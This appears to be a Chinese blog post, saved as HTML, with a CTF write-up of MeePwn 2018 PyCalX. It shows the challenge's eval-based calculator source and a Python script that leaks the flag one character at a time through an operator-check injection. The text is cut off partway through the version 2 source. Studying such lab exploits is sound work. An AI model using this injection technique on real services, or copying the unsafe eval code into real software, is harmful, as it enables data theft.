@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tiaonmmn.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#b46eba","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+
+  <meta name="description" content="一道 Python 的题，绕沙盒的。环境在这。 Part 1. PyCalX-Version1   题目给了源码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MeePwn2018-PyCalX 1-2">
+<meta property="og:url" content="http://tiaonmmn.github.io/2019/05/15/MeePwn2018-PyCalX-1-2/index.html">
+<meta property="og:site_name" content="Tiaonmmn&#39;s Littile House">
+<meta property="og:description" content="一道 Python 的题，绕沙盒的。环境在这。 Part 1. PyCalX-Version1   题目给了源码。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-05-15T07:08:11.000Z">
+<meta property="article:modified_time" content="2020-03-05T07:20:52.239Z">
+<meta property="article:author" content="Tiaonmmn.ZMZ">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="f-string">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://tiaonmmn.github.io/2019/05/15/MeePwn2018-PyCalX-1-2/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>MeePwn2018-PyCalX 1-2 | Tiaonmmn's Littile House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="\assets\css\APlayer.min.css" class="aplayer-style-marker">
+<script src="\assets\js\APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="\assets\js\Meting.min.js" class="meting-script-marker"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Tiaonmmn's Littile House</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#part-1.-pycalx-version1"><span class="nav-number">1.</span> <span class="nav-text">Part 1. PyCalX-Version1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#part-2.-pycalx-version2"><span class="nav-number">2.</span> <span class="nav-text">Part 2. PyCalX-Version2</span></a></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tiaonmmn.ZMZ"
+      src="/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Tiaonmmn.ZMZ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2019/05/15/MeePwn2018-PyCalX-1-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MeePwn2018-PyCalX 1-2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-05-15 15:08:11" itemprop="dateCreated datePublished" datetime="2019-05-15T15:08:11+08:00">2019-05-15</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-03-05 15:20:52" itemprop="dateModified" datetime="2020-03-05T15:20:52+08:00">2020-03-05</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/05/15/MeePwn2018-PyCalX-1-2/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/05/15/MeePwn2018-PyCalX-1-2/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>7.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>一道 Python 的题，绕沙盒的。环境在<a target="_blank" rel="noopener" href="https://github.com/Tiaonmmn/meepwn_2018_pycalx">这</a>。</p>
+<h1 id="part-1.-pycalx-version1">Part 1. PyCalX-Version1</h1>
+<p>  题目给了源码。 <a id="more"></a> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> cgi;</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = open(<span class="string">&#x27;/var/www/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">OK_200 = <span class="string">&quot;&quot;&quot;Content-type: text/html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;PyCalx&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;PyCalx&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;form&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder=&#x27;Value 1 (Example: 1  abc)&#x27; autofocus/&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder=&#x27;Operator (Example: + - * ** / // == != )&#x27; /&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder=&#x27;Value 2 (Example: 1  abc)&#x27; /&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&#x27;?source=1&#x27;&gt;Source&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;source&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">&#x27;source&#x27;</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>+escape(str(open(__file__,<span class="string">&#x27;r&#x27;</span>).read()))+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;value1&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;value2&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;op&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value</span>(<span class="params">val</span>):</span></span><br><span class="line">        val = str(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> str(val).isdigit(): <span class="keyword">return</span> int(val)</span><br><span class="line">        blacklist = [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>] <span class="comment"># I don&#x27;t like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            print(<span class="string">&#x27;&lt;center&gt;Invalid value %s&lt;/center&gt;&#x27;</span>%val)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_op</span>(<span class="params">val</span>):</span></span><br><span class="line">        val = str(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            print(<span class="string">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line">    </span><br><span class="line">    op = get_op(arguments[<span class="string">&#x27;op&#x27;</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">&#x27;value1&#x27;</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">&#x27;value2&#x27;</span>].value)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class="line">        print(<span class="string">&#x27;&lt;center&gt;Types of the values don\&#x27;t match&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span>+escape(calc_eval)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = str(eval(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">&#x27;True&#x27;</span> <span class="keyword">or</span> result == <span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">            print(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;Invalid&quot;</span>) <span class="comment"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>就是用 eval 实现了个简易计算器，而 FLAG 已经读进程序了，暂时不想绕沙盒 getshell 的事情。两个值要求不能出现”、’、[、]、(、) 这些符号，而中间的运算符要求必须是 <code>+ - * / ! =</code> 这几个，但是请注意源码 50 行，它使用的是 op [0]，后面的没做任何限制，因此可以出现 <code>+''</code> 这种符号。而程序允许我们使用字符串运算，但是没法直接返回结果。因此思路非常明确了：通过类似盲注的方式，逐位判断 FLAG。但是我们需要一个第三方能控制的变量，value1 没法真正参与运算。这个时候，我们发现还有一个 source 变量，虽然是用来显示源码的，但是它的作用域是全局，可以参与运算，并且可以控制。那么可以开始写脚本了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://192.168.60.130/cgi-bin/py.py?source=&#123;0&#125;&amp;value1=&#123;1&#125;&amp;op=&#123;2&#125;&amp;value2=&#123;3&#125;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">source=<span class="string">&quot;&quot;</span></span><br><span class="line">value1=urllib.parse.quote(<span class="string">&quot;WQERGFD&quot;</span>)</span><br><span class="line">op=urllib.parse.quote(<span class="string">&quot;+&#x27;&quot;</span>)</span><br><span class="line">value2=urllib.parse.quote(<span class="string">&quot; and FLAG&gt;source#&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    prev = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> chr(i) <span class="keyword">in</span> string.printable:</span><br><span class="line">            source=flag+chr(prev)</span><br><span class="line">            source=urllib.parse.quote(source)</span><br><span class="line">            result=requests.get(url.format(source,value1,op,value2)).text</span><br><span class="line">            <span class="comment">#print(result)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;False&quot;</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">&quot;security&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">                flag+=chr(prev<span class="number">-1</span>)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                prev=i</span><br></pre></td></tr></table></figure>
+<p>Python 比较字符串大小的时候，逐位判断，第一位相同时比较下一位。因此我们不需要 [1] 这种指示位数。</p>
+<h1 id="part-2.-pycalx-version2">Part 2. PyCalX-Version2</h1>
+<p>  第一个版本的 PyCalX 由于 op 没有仔细判断，第二个版本的就改过来了。   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> cgi;</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = open(<span class="string">&#x27;/var/www/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">OK_200 = <span class="string">&quot;&quot;&quot;Content-type: text/html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;PyCalx&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;PyCalx&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;form&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder=&#x27;Value 1 (Example: 1  abc)&#x27; autofocus/&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder=&#x27;Operator (Example: + - * ** / // == != )&#x27; /&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder=&#x27;Value 2 (Example: 1  abc)&#x27; /&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&#x27;?source=1&#x27;&gt;Source&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;source&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">&#x27;source&#x27;</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>+escape(str(open(__file__,<span class="string">&#x27;r&#x27;</span>).read()))+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;value1&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;value2&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;op&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value</span>(<span class="params">val</span>):</span></span><br><span class="line">        val = str(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> str(val).isdigit(): <span class="keyword">return</span> int(val)</span><br><span class="line">        blacklist = [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>] <span class="comment"># I don&#x27;t like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            print(<span class="string">&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_op</span>(<span class="params">val</span>):</span></span><br><span class="line">        val = str(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span 